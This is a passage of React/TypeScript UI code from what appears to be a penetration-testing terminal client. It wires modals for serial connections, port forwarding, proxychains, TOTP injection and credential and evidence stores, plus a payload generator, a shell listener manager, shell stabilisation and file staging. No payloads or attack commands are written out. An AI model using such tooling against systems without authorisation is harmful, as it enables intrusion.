                  return (
                    <div className="serial-hardware-card" style={{ background: 'rgba(5, 9, 16, 0.9)', border: '1px solid color-mix(in srgb, var(--accent-bright) 25%, transparent)', padding: '0.65rem 0.85rem' }}>
                      <div className="serial-hw-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.4rem' }}>
                        <span
                          className={`serial-hw-badge ${selectedPortInfo.isConnected ? 'connected' : 'offline'
                            }`}
                        >
                          {selectedPortInfo.isConnected
                            ? 'Connected & Active'
                            : 'Offline / No Device'}
                        </span>
                        <span className="serial-hw-type" style={{ fontSize: '0.72rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace' }}>
                          {selectedPortInfo.deviceType || 'Serial Port'}
                        </span>
                      </div>
                      <div className="serial-hw-body" style={{ display: 'flex', flexDirection: 'column', gap: '0.25rem', fontSize: '0.74rem' }}>
                        <div className="serial-hw-row">
                          <span className="serial-hw-label" style={{ color: '#94a3b8', marginRight: '6px' }}>Hardware:</span>
                          <span className="serial-hw-val" style={{ color: '#f1f5f9' }}>{selectedPortInfo.description}</span>
                        </div>
                        {selectedPortInfo.manufacturer && (
                          <div className="serial-hw-row">
                            <span className="serial-hw-label" style={{ color: '#94a3b8', marginRight: '6px' }}>Vendor:</span>
                            <span className="serial-hw-val" style={{ color: '#f1f5f9' }}>
                              {selectedPortInfo.manufacturer}
                            </span>
                          </div>
                        )}
                        {selectedPortInfo.hardwareId && (
                          <div className="serial-hw-row">
                            <span className="serial-hw-label" style={{ color: '#94a3b8', marginRight: '6px' }}>Hardware ID:</span>
                            <span className="serial-hw-val font-mono" style={{ color: 'var(--accent-bright)' }}>
                              {selectedPortInfo.hardwareId}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>
                  );
                }
                if (serialPorts.length === 0) {
                  return (
                    <div className="serial-no-ports-banner" style={{ background: 'color-mix(in srgb, var(--accent-bright) 5%, transparent)', border: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)', padding: '0.6rem 0.85rem', fontSize: '0.75rem', color: '#94a3b8' }}>
                      ℹ No active hardware detected. Connect your USB-UART adapter (FTDI, CP210x, CH340), Arduino, ESP32, or Raspberry Pi Pico, and click <strong><CyberIcon name="refresh" size={14} /> Refresh</strong>.
                    </div>
                  );
                }
                return null;
              })()}

              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                  onClick={() => void handleAutoDetectSerial()}
                  title="Probe and auto-detect COM port and baud rate"
                  disabled={serialDetecting}
                >
                  {serialDetecting ? 'Probing...' : <><CyberIcon name="bolt" size={14} /> Auto Detect Port & Baud</>}
                </button>
                {serialDetectResult && (
                  <span className="serial-autodetect-badge" style={{ fontSize: '0.72rem', color: '#10b981', background: 'rgba(16, 185, 129, 0.1)', padding: '2px 8px', border: '1px solid #10b981' }}>
                    {serialDetectResult.message} ({serialDetectResult.confidence})
                  </span>
                )}
              </div>

              <div className="form-grid-2col" style={{ width: '100%', boxSizing: 'border-box', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                <div style={{ minWidth: 0 }}>
                  <label className="cyber-label" htmlFor="serial-baud-rate">
                    Baud Rate
                  </label>
                  <select
                    id="serial-baud-rate"
                    aria-label="Baud Rate"
                    className="cyber-hud-select"
                    value={serialConfig.baudRate}
                    onChange={(e) =>
                      setSerialConfig((prev) => ({
                        ...prev,
                        baudRate: Number(e.target.value) || 115200,
                      }))
                    }
                  >
                    {[9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600, 2000000].map(
                      (b) => (
                        <option key={b} value={b}>
                          {b} baud
                        </option>
                      )
                    )}
                  </select>
                </div>

                <div style={{ minWidth: 0 }}>
                  <label className="cyber-label" htmlFor="serial-line-ending">
                    Line Ending
                  </label>
                  <select
                    id="serial-line-ending"
                    aria-label="Line Ending"
                    className="cyber-hud-select"
                    value={serialConfig.lineEnding}
                    onChange={(e) =>
                      setSerialConfig((prev) => ({ ...prev, lineEnding: e.target.value }))
                    }
                  >
                    <option value="crlf">CRLF (\r\n)</option>
                    <option value="lf">LF (\n)</option>
                    <option value="cr">CR (\r)</option>
                  </select>
                </div>
              </div>

              <button
                type="button"
                className="advanced-toggle-btn"
                onClick={() => setShowSerialAdvanced((prev) => !prev)}
                style={{ color: 'var(--accent-bright)', background: 'transparent', border: 'none', cursor: 'pointer', fontSize: '0.76rem', display: 'flex', alignItems: 'center', gap: '4px', padding: '2px 0' }}
              >
                <span>{showSerialAdvanced ? <CyberIcon name="chevron-down" size={14} /> : <CyberIcon name="chevron-right" size={14} />}</span>
                <span>Advanced Parameters (Data Bits, Parity, Stop Bits, Flow Control)</span>
              </button>

              {showSerialAdvanced && (
                <div className="advanced-serial-panel" style={{ background: 'rgba(5, 9, 16, 0.6)', border: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)', padding: '0.75rem', display: 'flex', flexDirection: 'column', gap: '0.65rem' }}>
                  <div className="form-grid-3col" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '0.5rem' }}>
                    <div>
                      <label className="cyber-label" htmlFor="serial-data-bits">
                        Data Bits
                      </label>
                      <select
                        id="serial-data-bits"
                        aria-label="Data Bits"
                        className="cyber-hud-select"
                        value={serialConfig.dataBits}
                        onChange={(e) =>
                          setSerialConfig((prev) => ({
                            ...prev,
                            dataBits: Number(e.target.value) || 8,
                          }))
                        }
                      >
                        <option value={8}>8 bits</option>
                        <option value={7}>7 bits</option>
                        <option value={6}>6 bits</option>
                        <option value={5}>5 bits</option>
                      </select>
                    </div>

                    <div>
                      <label className="cyber-label" htmlFor="serial-parity">
                        Parity
                      </label>
                      <select
                        id="serial-parity"
                        aria-label="Parity"
                        className="cyber-hud-select"
                        value={serialConfig.parity}
                        onChange={(e) =>
                          setSerialConfig((prev) => ({
                            ...prev,
                            parity: e.target.value as SerialConfig['parity'],
                          }))
                        }
                      >
                        <option value="none">None</option>
                        <option value="odd">Odd</option>
                        <option value="even">Even</option>
                        <option value="mark">Mark</option>
                        <option value="space">Space</option>
                      </select>
                    </div>

                    <div>
                      <label className="cyber-label" htmlFor="serial-stop-bits">
                        Stop Bits
                      </label>
                      <select
                        id="serial-stop-bits"
                        aria-label="Stop Bits"
                        className="cyber-hud-select"
                        value={serialConfig.stopBits}
                        onChange={(e) =>
                          setSerialConfig((prev) => ({
                            ...prev,
                            stopBits: e.target.value as SerialConfig['stopBits'],
                          }))
                        }
                      >
                        <option value="1">1 stop bit</option>
                        <option value="1.5">1.5 stop bits</option>
                        <option value="2">2 stop bits</option>
                      </select>
                    </div>
                  </div>

                  <div>
                    <label className="cyber-label" htmlFor="serial-flow-control">
                      Flow Control
                    </label>
                    <select
                      id="serial-flow-control"
                      aria-label="Flow Control"
                      className="cyber-hud-select"
                      value={serialConfig.flowControl}
                      onChange={(e) =>
                        setSerialConfig((prev) => ({
                          ...prev,
                          flowControl: e.target.value as SerialConfig['flowControl'],
                        }))
                      }
                    >
                      <option value="none">None</option>
                      <option value="hardware">Hardware (RTS / CTS)</option>
                      <option value="software">Software (XON / XOFF)</option>
                    </select>
                  </div>

                  <div className="checkbox-row" style={{ display: 'flex', gap: '1rem', flexWrap: 'wrap', marginTop: '4px' }}>
                    <label className="checkbox-label" style={{ fontSize: '0.75rem', color: '#cbd5e1' }}>
                      <input
                        type="checkbox"
                        checked={serialConfig.dtr}
                        onChange={(e) =>
                          setSerialConfig((prev) => ({ ...prev, dtr: e.target.checked }))
                        }
                      />
                      Initial DTR ON
                    </label>

                    <label className="checkbox-label" style={{ fontSize: '0.75rem', color: '#cbd5e1' }}>
                      <input
                        type="checkbox"
                        checked={serialConfig.rts}
                        onChange={(e) =>
                          setSerialConfig((prev) => ({ ...prev, rts: e.target.checked }))
                        }
                      />
                      Initial RTS ON
                    </label>

                    <label className="checkbox-label" style={{ fontSize: '0.75rem', color: '#cbd5e1' }}>
                      <input
                        type="checkbox"
                        checked={serialConfig.localEcho}
                        onChange={(e) =>
                          setSerialConfig((prev) => ({ ...prev, localEcho: e.target.checked }))
                        }
                      />
                      Local Echo
                    </label>
                  </div>
                </div>
              )}

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.75rem', marginTop: '0.65rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  onClick={() => setShowSerialModal(false)}
                >
                  Cancel
                </button>
                <button type="submit" className="cyber-btn cyber-btn-primary">
                  Connect Serial
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
      {showPortForwardingModal && (
        <PortForwardingView
          rules={forwardRules}
          activeTunnels={activeTunnels}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: `${h.effectiveUser}@${h.address}:${h.effectivePort}`,
          }))}
          engagements={engagementsList.map((e) => ({ id: e.id, name: e.name }))}
          activeEngagementId={activeEngagement?.id}
          activeSessions={(() => {
            const sessions: { sessionId: string; hostId?: string; title: string }[] = [];
            for (const t of tabs) {
              const panes = collectPanes(t.rootNode);
              for (const p of panes) {
                if (
                  p.sessionId &&
                  !p.sessionId.startsWith('local-') &&
                  !p.sessionId.startsWith('serial-') &&
                  !p.sessionId.startsWith('sftp-')
                ) {
                  if (!sessions.some((s) => s.sessionId === p.sessionId)) {
                    sessions.push({
                      sessionId: p.sessionId,
                      hostId: p.hostId || t.hostId,
                      title: p.title || t.title,
                    });
                  }
                }
              }
            }
            return sessions;
          })()}
          onSaveRule={handleSaveForwardRule}
          onDeleteRule={handleDeleteForwardRule}
          onStartTunnel={handleStartForwardTunnel}
          onStartTunnelWithHost={handleStartTunnelWithHost}
          onStopTunnel={handleStopForwardTunnel}
          onOpenProxychainsExport={handleOpenProxychainsExport}
          initialHostId={forwardingModalHostId}
          onClose={() => {
            setForwardingModalHostId(undefined);
            setShowPortForwardingModal(false);
          }}
        />
      )}

      {showProxyProfilesModal && (
        <ProxyProfilesView
          profiles={vaultSummary.proxyProfiles || []}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
            port: h.effectivePort,
          }))}
          engagements={engagementsList.map((e) => ({ id: e.id, name: e.name }))}
          activeEngagementId={activeEngagement?.id}
          onSaveProfile={handleSaveProxyProfile}
          onDeleteProfile={handleDeleteProxyProfile}
          onOpenProxychainsExport={handleOpenProxychainsExport}
          onClose={() => setShowProxyProfilesModal(false)}
        />
      )}

      {showProxychainsExportModal && (
        <ProxychainsExportModal
          initialOptions={proxychainsOptions}
          engagements={engagementsList.map((e) => ({ id: e.id, name: e.name }))}
          activeEngagementId={activeEngagement?.id}
          onGenerateConfig={handleGenerateProxychainsConfig}
          onSaveToFile={handleSaveProxychainsFile}
          onClose={() => setShowProxychainsExportModal(false)}
        />
      )}

      {showSnippetsModal && (
        <SnippetsManagerModal
          snippets={mergedSnippets}
          onSaveSnippet={handleSaveSnippet}
          onDeleteSnippet={handleDeleteSnippet}
          onRunSnippet={(snip) => void handleTriggerSnippet(snip, snippetActiveSessionId)}
          initialPrefillBody={snippetPrefillBody}
          onDockToView={() => void handleDockToolIntoSplit('snippets', 'right')}
          onClose={() => {
            setShowSnippetsModal(false);
            setSnippetPrefillBody('');
          }}
          getFileConfig={async () => {
            const api = getWailsBindings();
            if (api?.GetSnippetsConfig) return api.GetSnippetsConfig();
            return { filePath: 'command_snippets.json', snippetCount: mergedSnippets.length, exists: false };
          }}
          setFilePath={async (path) => {
            const api = getWailsBindings();
            if (api?.SetSnippetsPath) return api.SetSnippetsPath(path);
            throw new Error('SetSnippetsPath API not available');
          }}
          onReloadFromFile={async () => {
            const api = getWailsBindings();
            if (api?.ListSnippetsFromFile) {
              const loaded = await api.ListSnippetsFromFile();
              setExternalSnippets(loaded || []);
              return loaded || [];
            }
            return [];
          }}
          onSelectFile={(t, fn, fp) => getWailsBindings()?.SelectFileDialog?.(t, fn, fp) ?? Promise.resolve('')}
          onSelectDirectory={(t) => getWailsBindings()?.SelectDirectoryDialog?.(t) ?? Promise.resolve('')}
        />
      )}

      {runModalSnippet && runModalContext && (
        <SnippetRunModal
          snippet={runModalSnippet}
          context={runModalContext}
          mode={runModalMode}
          onExecute={handleExecuteSnippetFromModal}
          onInsert={async (resolvedCmd) => {
            if (snippetActiveSessionId) {
              await getWailsBindings()?.WriteTerminal?.(snippetActiveSessionId, resolvedCmd);
              setStatusMessage(`Inserted snippet "${runModalSnippet.name}" into terminal.`);
            }
          }}
          onClose={() => {
            setRunModalSnippet(null);
            setRunModalContext(null);
          }}
        />
      )}

      {showTotpModal && (
        <TotpManagerModal
          isOpen={showTotpModal}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: `${h.effectiveUser}@${h.address}:${h.effectivePort}`,
          }))}
          activeSessionId={sessionId}
          onInjectCode={handleInjectTotp}
          onRefreshVault={refreshVaultState}
          onDockToView={() => void handleDockToolIntoSplit('totp', 'right')}
          onClose={() => setShowTotpModal(false)}
        />
      )}

      {showTotpQuickSelector && (
        <TotpQuickSelectorModal
          isOpen={showTotpQuickSelector}
          tokens={totpTokensList.length > 0 ? totpTokensList : (vaultSummary.totpRecords || [])}
          currentHostId={activePane?.hostId || activeTab?.hostId}
          currentHostLabel={
            vaultSummary.hosts.find(
              (h) => h.id === (activePane?.hostId || activeTab?.hostId)
            )?.label || (activePane?.hostId || activeTab?.hostId ? 'Remote Host' : undefined)
          }
          onSelectAndInject={async (totpId) => {
            setShowTotpQuickSelector(false);
            await handleInjectTotp(totpId);
          }}
          onOpenFullVault={() => {
            setShowTotpQuickSelector(false);
            setShowTotpModal(true);
          }}
          onClose={() => setShowTotpQuickSelector(false)}
        />
      )}

      {showNotesModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Host Notes & Documentation"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowNotesModal(false);
            }
          }}
        >
          <div
            className="cyber-dialog-card notes-modal-card"
            style={{
              maxWidth: '1040px',
              width: '96vw',
              maxHeight: '92vh',
              display: 'flex',
              flexDirection: 'column',
              overflow: 'hidden',
              position: 'relative',
              padding: 0,
            }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />
            <NotesView
              notes={notes}
              hosts={vaultSummary.hosts.map((h) => ({
                id: h.id,
                label: h.label,
                address: h.address,
              }))}
              activeHostId={notesModalHostId}
              initialNoteId={notesModalInitialNoteId}
              onSaveNote={handleSaveNote}
              onDeleteNote={handleDeleteNote}
              onOpenAsTab={() => {
                const hid = notesModalHostId;
                const nid = notesModalInitialNoteId;
                setShowNotesModal(false);
                openNotesTab(hid, nid);
              }}
              onClose={() => setShowNotesModal(false)}
            />
          </div>
        </div>
      )}

      {showSessionLogsModal && (
        <SessionLogsModal
          logs={sessionLogs}
          onRefreshLogs={refreshSessionLogs}
          onReadLog={handleReadSessionLog}
          onDeleteLog={handleDeleteSessionLog}
          onExportLog={handleExportSessionLog}
          onStopActiveLog={async (sid) => {
            await handleToggleSessionLog(sid);
          }}
          onClose={() => setShowSessionLogsModal(false)}
        />
      )}

      {hostKeyPrompt && (
        <div
          className="modal-backdrop host-key-modal-backdrop"
          style={{ zIndex: 100050 }}
          role="dialog"
          aria-label="Verify SSH Host Key"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              void handleHostKeyDecision(false);
            }
          }}
        >
          <div
            className="modal-card host-key-card"
            style={{
              zIndex: 100051,
              border: '2px solid var(--accent-bright)',
              boxShadow: '0 0 32px rgba(45, 212, 191, 0.5)',
            }}
          >
            <h2>Verify Unknown Host Key</h2>
            <p>
              Host: <strong>{hostKeyPrompt.hostPattern}:{hostKeyPrompt.port}</strong>
            </p>
            <p>
              Algorithm: <code>{hostKeyPrompt.keyType}</code>
            </p>
            <p>
              Fingerprint: <code>{hostKeyPrompt.fingerprint}</code>
            </p>
            <div className="modal-actions">
              <button
                type="button"
                className="btn-danger"
                onClick={() => void handleHostKeyDecision(false)}
              >
                Reject &amp; Abort
              </button>
              <button
                type="button"
                className="btn-primary"
                onClick={() => void handleHostKeyDecision(true)}
              >
                Trust Host Key
              </button>
            </div>
          </div>
        </div>
      )}

      {showConflictModal && activeConflictReport && (
        <VaultConflictModal
          isOpen={showConflictModal}
          report={activeConflictReport}
          conflictFilePath={activeConflictFilePath}
          onClose={() => setShowConflictModal(false)}
          onResolve={async (resolutions, deleteFile) => {
            const api = getWailsBindings();
            if (api?.ResolveVaultConflicts) {
              await api.ResolveVaultConflicts(resolutions, deleteFile);
            }
            await refreshVaultState();
            await refreshSyncInfo();
            setStatusMessage('Vault conflicts successfully resolved and saved.');
          }}
        />
      )}

      {showImportModal && (
        <ImportModal
          isOpen={showImportModal}
          onClose={() => setShowImportModal(false)}
          existingGroups={vaultSummary.groups.map((g) => ({ id: g.id, name: g.name }))}
          onImportComplete={async () => {
            await refreshVaultState();
            setStatusMessage('PuTTY / Termius sessions successfully imported into Vault.');
          }}
        />
      )}

      {showRawTcpModal && (
        <RawTcpModal
          isOpen={showRawTcpModal}
          onClose={() => setShowRawTcpModal(false)}
          onConnect={handleConnectRawTcp}
          onStartListener={handleStartRawTcpListener}
          onStopListener={handleStopRawTcpListener}
          listeners={rawTcpListeners}
          refreshListeners={refreshRawTcpListeners}
        />
      )}

      {showCredStoreModal && (
        <CredentialStoreModal
          isOpen={showCredStoreModal}
          onClose={() => setShowCredStoreModal(false)}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
          }))}
          activeHostId={activeTab?.hostId}
        />
      )}

      {showEvidenceModal && (
        <EvidenceVaultModal
          isOpen={showEvidenceModal}
          onClose={() => setShowEvidenceModal(false)}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
          }))}
          activeHostId={activeTab?.hostId}
          onOpenFileManager={() => {
            setShowEvidenceModal(false);
            setSettingsActiveTab('files');
            setShowGlobalSettingsModal(true);
          }}
        />
      )}

      {showEngagementHubModal && (
        <EngagementHubModal
          isOpen={showEngagementHubModal}
          onClose={() => {
            setShowEngagementHubModal(false);
            void refreshVaultState();
          }}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
            tags: h.tags,
            engagementId: h.engagementId,
          }))}
          onOpenCredStore={() => {
            setShowEngagementHubModal(false);
            setShowCredStoreModal(true);
          }}
          onOpenEvidenceVault={() => {
            setShowEngagementHubModal(false);
            setShowEvidenceModal(true);
          }}
          onEditEngagement={(eng) => {
            setEditingEngagement(eng);
            setShowNewEngagementModal(true);
          }}
          onRefreshVault={refreshVaultState}
        />
      )}

      {showNewEngagementModal && (
        <NewEngagementModal
          isOpen={showNewEngagementModal}
          existingEngagement={editingEngagement}
          onSave={handleSaveEngagement}
          onClose={() => {
            setShowNewEngagementModal(false);
            setEditingEngagement(null);
          }}
        />
      )}

      {/* Terminal Selection Context Menu & Quick Save Modals (F-19) */}
      {terminalContextMenu && (
        <TerminalContextMenu
          x={terminalContextMenu.x}
          y={terminalContextMenu.y}
          sessionId={terminalContextMenu.sessionId}
          selectedText={terminalContextMenu.selectedText}
          hostLabel={(() => {
            const h = vaultSummary.hosts.find((cand) => cand.id === terminalContextMenu.hostId);
            return h ? `${h.label} (${h.address})` : undefined;
          })()}
          onCopy={() => {
            if (navigator.clipboard?.writeText) {
              void navigator.clipboard.writeText(terminalContextMenu.selectedText);
              setStatusMessage('Selection copied to clipboard.');
            }
          }}
          onSaveAsCredential={() => {
            setSaveSelectionCredModal({
              isOpen: true,
              selectedText: terminalContextMenu.selectedText,
              hostId: terminalContextMenu.hostId,
            });
          }}
          onSaveAsEvidence={() => {
            setSaveSelectionEvidenceModal({
              isOpen: true,
              selectedText: terminalContextMenu.selectedText,
              hostId: terminalContextMenu.hostId,
            });
          }}
          onSaveToNotes={() => {
            setSaveSelectionNoteModal({
              isOpen: true,
              selectedText: terminalContextMenu.selectedText,
              hostId: terminalContextMenu.hostId,
            });
          }}
          onCreateFinding={() => {
            setSaveSelectionFindingModal({
              isOpen: true,
              selectedText: terminalContextMenu.selectedText,
              hostId: terminalContextMenu.hostId,
            });
          }}
          onRunInTerminal={() => {
            handleTerminalInput(terminalContextMenu.sessionId, terminalContextMenu.selectedText + '\n');
          }}
          onClose={() => setTerminalContextMenu(null)}
        />
      )}

      {saveSelectionCredModal?.isOpen && (
        <SaveSelectionCredModal
          isOpen={saveSelectionCredModal.isOpen}
          selectedText={saveSelectionCredModal.selectedText}
          initialHostId={saveSelectionCredModal.hostId}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
          }))}
          initialEngagementId={activeEngagement?.id}
          engagements={engagementsList.map((e) => ({
            id: e.id,
            name: e.name,
          }))}
          onSave={handleSaveSelectionCredential}
          onClose={() => setSaveSelectionCredModal(null)}
        />
      )}

      {saveSelectionEvidenceModal?.isOpen && (
        <SaveSelectionEvidenceModal
          isOpen={saveSelectionEvidenceModal.isOpen}
          selectedText={saveSelectionEvidenceModal.selectedText}
          initialHostId={saveSelectionEvidenceModal.hostId}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
          }))}
          initialEngagementId={activeEngagement?.id}
          engagements={engagementsList.map((e) => ({
            id: e.id,
            name: e.name,
          }))}
          onSave={handleSaveSelectionEvidence}
          onClose={() => setSaveSelectionEvidenceModal(null)}
        />
      )}

      {saveSelectionNoteModal?.isOpen && (
        <SaveSelectionNoteModal
          isOpen={saveSelectionNoteModal.isOpen}
          selectedText={saveSelectionNoteModal.selectedText}
          initialHostId={saveSelectionNoteModal.hostId}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
          }))}
          initialEngagementId={activeEngagement?.id}
          engagements={engagementsList.map((e) => ({
            id: e.id,
            name: e.name,
          }))}
          onSave={handleSaveSelectionNote}
          onClose={() => setSaveSelectionNoteModal(null)}
        />
      )}

      {saveSelectionFindingModal?.isOpen && (
        <SaveSelectionFindingModal
          isOpen={saveSelectionFindingModal.isOpen}
          selectedText={saveSelectionFindingModal.selectedText}
          initialHostId={saveSelectionFindingModal.hostId}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
          }))}
          initialEngagementId={activeEngagement?.id}
          engagements={engagementsList.map((e) => ({
            id: e.id,
            name: e.name,
          }))}
          onSave={handleSaveSelectionFinding}
          onClose={() => setSaveSelectionFindingModal(null)}
        />
      )}

      {shellStabilizeModal?.isOpen && (
        <ShellStabilizeModal
          isOpen={shellStabilizeModal.isOpen}
          sessionId={shellStabilizeModal.sessionId}
          sessionTitle={shellStabilizeModal.sessionTitle}
          isRawTcp={shellStabilizeModal.isRawTcp}
          initialCols={shellStabilizeModal.cols}
          initialRows={shellStabilizeModal.rows}
          onStabilize={handleRunShellStabilize}
          onClose={() => setShellStabilizeModal(null)}
        />
      )}

      {showNmapImportModal && (
        <NmapImportModal
          isOpen={showNmapImportModal}
          engagements={engagementsList.map((e) => ({ id: e.id, name: e.name }))}
          groups={vaultSummary.groups.map((g) => ({ id: g.id, name: g.name }))}
          activeEngagementId={activeEngagement?.id}
          onScanXML={handleScanNmapXML}
          onImportXML={handleImportNmapXML}
          onClose={() => setShowNmapImportModal(false)}
        />
      )}

      {showPayloadGeneratorModal && (
        <PayloadGeneratorModal
          onClose={() => setShowPayloadGeneratorModal(false)}
          activeSessionId={sessionId}
          activeHostAddress={activeTab?.hostId ? vaultSummary.hosts.find((h) => h.id === activeTab.hostId)?.address : null}
          onSendToTerminal={(sId, text) => {
            void getWailsBindings()?.WriteTerminal?.(sId, text);
          }}
          listTemplates={async () => {
            const api = getWailsBindings();
            if (api?.ListPayloadTemplates) return api.ListPayloadTemplates();
            return [];
          }}
          saveTemplate={async (tmpl) => {
            const api = getWailsBindings();
            if (api?.SavePayloadTemplate) await api.SavePayloadTemplate(tmpl);
          }}
          deleteTemplate={async (id) => {
            const api = getWailsBindings();
            if (api?.DeletePayloadTemplate) await api.DeletePayloadTemplate(id);
          }}
          renderPayload={async (opts) => {
            const api = getWailsBindings();
            if (api?.RenderPayload) return api.RenderPayload(opts);
            throw new Error('RenderPayload API not available');
          }}
          saveAsSnippet={async (opts, name) => {
            const api = getWailsBindings();
            if (api?.SavePayloadAsSnippet) {
              await api.SavePayloadAsSnippet(opts, name);
              await refreshVaultState();
            }
          }}
          getFileConfig={async () => {
            const api = getWailsBindings();
            if (api?.GetPayloadTemplatesConfig) return api.GetPayloadTemplatesConfig();
            return { filePath: 'data/payload_templates.json', templateCount: 0, exists: false };
          }}
          setFilePath={async (path) => {
            const api = getWailsBindings();
            if (api?.SetPayloadTemplatesPath) return api.SetPayloadTemplatesPath(path);
            throw new Error('SetPayloadTemplatesPath API not available');
          }}
          onSelectFile={(t, fn, fp) => getWailsBindings()?.SelectFileDialog?.(t, fn, fp) ?? Promise.resolve('')}
          onSelectDirectory={(t) => getWailsBindings()?.SelectDirectoryDialog?.(t) ?? Promise.resolve('')}
        />
      )}

      {showListenerManagerModal && (
        <ListenerManagerModal
          onClose={() => setShowListenerManagerModal(false)}
          listProfiles={async () => {
            const api = getWailsBindings();
            if (api?.ListListenerProfiles) return api.ListListenerProfiles();
            return [];
          }}
          saveProfile={async (prof) => {
            const api = getWailsBindings();
            if (api?.SaveListenerProfile) await api.SaveListenerProfile(prof);
          }}
          deleteProfile={async (profileId) => {
            const api = getWailsBindings();
            if (api?.DeleteListenerProfile) await api.DeleteListenerProfile(profileId);
          }}
          startListener={async (prof) => {
            const api = getWailsBindings();
            if (api?.StartManagedListener) return api.StartManagedListener(prof);
            throw new Error('StartManagedListener API unavailable');
          }}
          stopListener={async (listenerId) => {
            const api = getWailsBindings();
            if (api?.StopManagedListener) await api.StopManagedListener(listenerId);
          }}
          listActiveListeners={async () => {
            const api = getWailsBindings();
            if (api?.ListActiveManagedListeners) return api.ListActiveManagedListeners();
            return [];
          }}
          generateCommand={async (prof) => {
            const api = getWailsBindings();
            if (api?.GenerateListenerCommand) return api.GenerateListenerCommand(prof);
            return '';
          }}
          onSpawnTerminal={() => {
            void handleOpenLocalTerminal('powershell');
          }}
          onOpenSessionTab={(sId) => {
            const tabId = `tab-rawtcp-${sId}`;
            const paneId = `pane-rawtcp-${sId}`;
            const tabTitle = `Raw TCP: ${sId}`;
            const newTab: TabItem = {
              id: tabId,
              title: tabTitle,
              color: '#00f0ff',
              tabType: 'terminal',
              rootNode: {
                id: paneId,
                type: 'pane',
                sessionId: sId,
                title: tabTitle,
              },
              activePaneId: paneId,
            };
            setTabs((prev) => [...prev, newTab]);
            setActiveTabId(tabId);
          }}
          onStabilizeSession={(sId) => {
            setShellStabilizeModal({
              isOpen: true,
              sessionId: sId,
              sessionTitle: `Raw TCP Session (${sId})`,
              isRawTcp: true,
              cols: 80,
              rows: 24,
            });
          }}
          onOpenPayloadGenerator={() => {
            setShowPayloadGeneratorModal(true);
          }}
        />
      )}

      {showFileTransferModal && (
        <FileTransferModal
          onClose={() => setShowFileTransferModal(false)}
          activeSessionId={sessionId}
          activeHostAddress={activeTab?.hostId ? vaultSummary.hosts.find((h) => h.id === activeTab.hostId)?.address : null}
          onSendToTerminal={(sId, text) => {
            void getWailsBindings()?.WriteTerminal?.(sId, text);
          }}
          onSpawnLocalTerminal={(initialCmd) => {
            const api = getWailsBindings();
            if (api?.OpenLocalTerminal) {
              void api.OpenLocalTerminal('powershell', { cols: 120, rows: 34 }).then((sid) => {
                openSessionTab(sid, 'File Staging Server', undefined, '#10b981');
                setTimeout(() => {
                  void api.WriteTerminal?.(sid, `${initialCmd}\n`);
                }, 400);
              });
            } else {
              void handleOpenLocalTerminal('powershell');
            }
          }}
          getDefaultDir={async () => {
            const api = getWailsBindings();
            if (api?.GetDefaultStagingDirectory) return api.GetDefaultStagingDirectory();
            return '.';
          }}
          getLocalIPs={async () => {
            const api = getWailsBindings();
            if (api?.GetLocalNetworkIPs) return api.GetLocalNetworkIPs();
            return [];
          }}
          listServers={async () => {
            const api = getWailsBindings();
            if (api?.ListFileTransferServers) return api.ListFileTransferServers();
            return [];
          }}
          startServer={async (cfg) => {
            const api = getWailsBindings();
            if (api?.StartFileTransferServer) return api.StartFileTransferServer(cfg);
            throw new Error('StartFileTransferServer API unavailable');
          }}
          stopServer={async (id) => {
            const api = getWailsBindings();
            if (api?.StopFileTransferServer) await api.StopFileTransferServer(id);
          }}
          generateServerCommand={async (cfg) => {
            const api = getWailsBindings();
            if (api?.GenerateFileServerCommand) return api.GenerateFileServerCommand(cfg);
            return `python3 -m http.server ${cfg.port || 8000}`;
          }}
          listFiles={async (dir) => {
            const api = getWailsBindings();
            if (api?.ListHostedTransferFiles) return api.ListHostedTransferFiles(dir);
            return [];
          }}
          hashFile={async (rootDir, relPath) => {
            const api = getWailsBindings();
            if (api?.HashHostedTransferFile) return api.HashHostedTransferFile(rootDir, relPath);
            throw new Error('HashHostedTransferFile API unavailable');
          }}
          generateCommands={async (opts) => {
            const api = getWailsBindings();
            if (api?.GenerateFileTransferCommands) return api.GenerateFileTransferCommands(opts);
            return {
              filename: opts.filename,
              url: `http://${opts.localIp}:${opts.port}/${opts.filename}`,
              localIp: opts.localIp,
              port: opts.port,
              methods: [],
            };
          }}
          onSelectDirectory={(t) => getWailsBindings()?.SelectDirectoryDialog?.(t) ?? Promise.resolve('')}
        />
      )}

      {showPivotManagerModal && (
        <PivotManagerModal
